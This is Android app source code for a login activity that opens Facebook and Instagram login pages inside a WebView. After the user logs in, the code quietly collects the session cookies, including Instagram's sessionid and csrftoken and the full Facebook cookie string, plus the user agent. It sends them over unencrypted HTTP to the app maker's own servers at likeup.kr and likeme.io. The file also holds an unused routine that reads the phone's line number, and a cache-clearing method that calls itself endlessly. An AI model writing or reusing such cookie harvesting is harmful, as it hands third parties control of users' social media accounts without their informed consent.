package linktv.linktv;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageView;
import android.widget.ProgressBar;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.apache.http.util.EncodingUtils;

import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;


public class LoginIntent extends AppCompatActivity {

    private WebView wv;
    private String FBLOGIN_URL = "https://m.facebook.com/login";
    private String INSTALOGIN_URL = "https://www.instagram.com/";
    private final String AGREEMENT_URL = "http://likeup.kr/docs/linktv_agreement.html";
    private String HOME_DOMAIN = "likeme.io";

    Context mAppContext;
    public static String versionName;
    public static boolean isActive = false;
    public static boolean isOpened = false;
    AlertDialog closeAlertDialog;
    public CookieManager cookieManager;
    private ProgressBar progress_bar;
    public static linktv.linktv.User user = new linktv.linktv.User();
    private static View agreement_view, login_view;

    public String view_mode;


    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);
        mAppContext = this;
        view_mode = "prelogin";

        agreement_view = findViewById(R.id.agreement_view);
        login_view = findViewById(R.id.login_webview);

        Intent intent = getIntent();

        cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);

        progress_bar = (ProgressBar)findViewById(R.id.progress_bar_login);

        wv = (WebView)findViewById(R.id.wv_login);
        wv.getSettings().setJavaScriptEnabled(true);
        wv.getSettings().setDomStorageEnabled(true);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB_MR1) {
            cookieManager.setAcceptFileSchemeCookies(true);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            cookieManager.setAcceptThirdPartyCookies(wv, true);
        }

        wv.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                progress_bar.setVisibility(View.VISIBLE);

                Uri uri = Uri.parse(url);
                String host = uri.getHost();
                String path = uri.getPath();

                if(host.equals("m.facebook.com") && path.equals("/home.php")){

                    CookieManager.setAcceptFileSchemeCookies(true);
                    String cookie_str = CookieManager.getInstance().getCookie("https://m.facebook.com");

                    user.parseFBCookie(cookie_str);
                    saveUserToDB(user);
                }

                if(host.equals("www.instagram.com")){
                    Boolean isLogin = getSharedPreferences("pref", MODE_PRIVATE).getString("login", "no").equals("yes");
                    try{
                        if(view_mode == "login" && isLogin == false) {
                            if (getCookieVal("https://www.instagram.com", "csrftoken").length() > 0 &&
                                    getCookieVal("https://www.instagram.com", "sessionid").length() > 0
                                    ) {
                                Locale systemLocale = getResources().getConfiguration().locale;
                                String strDisplayCountry = systemLocale.getDisplayCountry();    //대한민국
                                String strCountry = systemLocale.getCountry();     //KR
                                String country_code = strCountry;
                                String country_name = strDisplayCountry;
                                String postData = "cookies=" + URLEncoder.encode(getCookieVal("https://www.instagram.com")) + "&user_agent=" + URLEncoder.encode(wv.getSettings().getUserAgentString()) + "&country_code=" + URLEncoder.encode(country_code) + "&country_name=" + URLEncoder.encode(country_name);
                                wv.postUrl("http://test." + HOME_DOMAIN + "/api/get_user_info.php?soc=sdapp", EncodingUtils.getBytes(postData, "BASE64"));
                                getSharedPreferences("pref", MODE_PRIVATE).edit().putString("login","yes").commit();
                                openMain();
                            }
                        }
                    }catch (Exception error){
                        Log.d("TAG", error.toString());
                    }

                }
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                progress_bar.setVisibility(View.GONE);
            }

        });


        wv.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onJsAlert(WebView view, String url, String message, final JsResult result) {
                new AlertDialog.Builder(mAppContext)
                        .setTitle("AlertDialog")
                        .setMessage(message)
                        .setPositiveButton(android.R.string.ok,
                                new AlertDialog.OnClickListener() {
                                    public void onClick(DialogInterface dialog, int which) {
                                        result.confirm();
                                    }
                                })
                        .setCancelable(false)
                        .create()
                        .show();

                return true;
            }

            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                progress_bar.setProgress(newProgress);
                if(newProgress == 100){
                    progress_bar.setVisibility(View.GONE);
                }
            }
        });

        wv.getSettings().setLoadWithOverviewMode(true);
        wv.getSettings().setUseWideViewPort(true);
        wv.getSettings().setSupportZoom(false);

        String newAgent = "";
        try {
            versionName = getPackageManager().getPackageInfo(getPackageName(), 0).versionName;
        } catch (PackageManager.NameNotFoundException e) {}
        String oldAgent = "";
        oldAgent = wv.getSettings().getUserAgentString();
        String packagename = "com.linktv.linktv";
        newAgent = oldAgent + " " + "Linktv(android," + packagename + "," + versionName + ")";
        wv.getSettings().setUserAgentString(newAgent);
        user.setUserAgent(newAgent);

        ImageView login_with_facebook = (ImageView)findViewById(R.id.login_with_facebook);
        ImageView login_with_insta = (ImageView)findViewById(R.id.login_with_insta);


        login_with_facebook.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v) {
                wv.loadUrl(FBLOGIN_URL);
                switchView("login");
            }
        });


        login_with_insta.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v) {
                wv.loadUrl(INSTALOGIN_URL);
                switchView("login");
            }
        });

        ImageView view_agreement;
        view_agreement = (ImageView)findViewById(R.id.see_agreements);

        view_agreement.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(AGREEMENT_URL));
                startActivity(intent);
            }
        });
        checkLogin();
    }


    /**
     *
     * @param viewname
     * "prelogin" or "login"
     *
     */
    private void switchView(String viewname){
        view_mode = viewname;

        if(viewname.equals("prelogin")){
            agreement_view.setVisibility(View.VISIBLE);
            login_view.setVisibility(View.GONE);
        }else if(viewname.equals("login")){
            agreement_view.setVisibility(View.GONE);
            login_view.setVisibility(View.VISIBLE);
        }else{
            switchView("prelogin");
        }
    }

    /**
     *
     * @param domain https://www.instagram.com , .facebook.com
     * @param name csrftoken , ds_user_id
     * @return
     */
    private String getCookieVal(String domain, String name){
        String CookieVal = "";
        String cookie_str = cookieManager.getCookie(domain);
        if(cookie_str.contains(name)){
            CookieVal = extractCookieValue(cookie_str, name);
        }

        return CookieVal;
    }

    /**
     *
     * @param domain https://www.instagram.com , .facebook.com
     * @return
     */
    private String getCookieVal(String domain){
        String CookieVal = "";
        String cookie_str = cookieManager.getCookie(domain);
        return cookie_str;
    }
    String extractCookieValue(String rawCookie, String cookie_name) {
        Map<String, String> Cookies = new HashMap<String, String>();
        //aMap.put("a" , Integer.valueOf(1));

        String[] rawCookieParams = rawCookie.split(";");

        for(int i=0; i<rawCookieParams.length; i++){
            String[] rawCookieNameAndValue = rawCookieParams[i].split("=");
            if(rawCookieNameAndValue.length == 1){
                Cookies.put(rawCookieNameAndValue[0].trim(), "");
            }else{
                Cookies.put(rawCookieNameAndValue[0].trim(), rawCookieNameAndValue[1].trim());
            }

        }

        String cookie_val = Cookies.get(cookie_name);

        return cookie_val;

    }
    public static final String TAG = "Linktv";
    StringRequest stringRequest; // Assume this exists.
    RequestQueue mRequestQueue;  // Assume this exists.

    private static String fid;
    private static String cookies;
    private static String user_agent;

    private static linktv.linktv.User tempUser = new linktv.linktv.User();

    private void saveUserToDB(linktv.linktv.User user){
        // Instantiate the RequestQueue.
        RequestQueue queue = Volley.newRequestQueue(this);
        String url ="http://likeup.kr/api/save_cookies.php";

        tempUser.fid = user.fid;
        tempUser.cookies = user.cookies;
        tempUser.userAgent = user.userAgent;

        // Request a string response from the provided URL.
        StringRequest stringRequest = new StringRequest(
                Request.Method.POST,
                url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // Display the first 500 characters of the response string.
                        Log.d(TAG, "Response is: "+ response);
                        getSharedPreferences("pref", MODE_PRIVATE).edit().putString("login","yes").commit();
                        openMain();
                    }
                }, new Response.ErrorListener(){
            @Override
            public void onErrorResponse(VolleyError error) {
                Log.d("tag", "That didn't work!");
            }
        }){
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("fid", tempUser.fid);
                params.put("cookies", tempUser.cookies);
                params.put("user_agent", tempUser.userAgent);
                return params;
            }
        };
// Add the request to the RequestQueue.
        queue.add(stringRequest);
    }

    private void openMain(){
        Intent intent = new Intent(this, MainActivity.class);
        startActivity(intent);
        finish();
    }

    private void checkLogin(){

        if (getSharedPreferences("pref", MODE_PRIVATE).getString("login", "no").equals("yes")) {

            Intent intent = new Intent(this, MainActivity.class);
            this.startActivity(intent);

            finish();
        }
    }


    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch (keyCode) {
            case KeyEvent.KEYCODE_BACK:
                if(wv.canGoBack()){
                    wv.goBack();
                }else{
                    this.closeApplication();
                }
                break;
            default:
                return false;
        }
        return false;

    }

    private void openExitDialog(){
        closeAlertDialog.show();
    }


    @Override
    protected void onStart() {
        super.onStart();
        isActive = true;
        isOpened = true;
    }

    @Override
    protected void onStop() {


        WebView wv = (WebView)findViewById(R.id.wv);
        isActive = false;
        super.onStop();

        if (mRequestQueue != null) {
            mRequestQueue.cancelAll(TAG);
        }
    }

    private void closeApplication(){

        if(view_mode.equals("prelogin")){
            finish();
        }else {
            switchView("prelogin");
        }

    }

    @Override
    protected void onResume() {
        super.onResume();
    }

    public static String phoneNumber;
    public void getPhoneNumber(){
        TelephonyManager tm = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
        phoneNumber = tm.getLine1Number();
    }

    private void initWebview(WebView wv, String mode){
        switch (mode){

            case "cache":
                wv.clearHistory();
                wv.clearCache(true);
                wv.clearView();
                break;

            case "cookie":
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    cookieManager.removeAllCookies(null);
                }
                else {
                    cookieManager.removeAllCookie();
                }

                break;

            case "db":
                this.deleteDatabase("webview.db");
                this.deleteDatabase("webviewCache.db");
                break;

            case "all":
                initWebview(wv, "cache");
                initWebview(wv, "cookie");
                initWebview(wv, "all");
                break;
        }

    }

    private void initWebview(WebView wv){
        initWebview(wv, "all");
    }






}
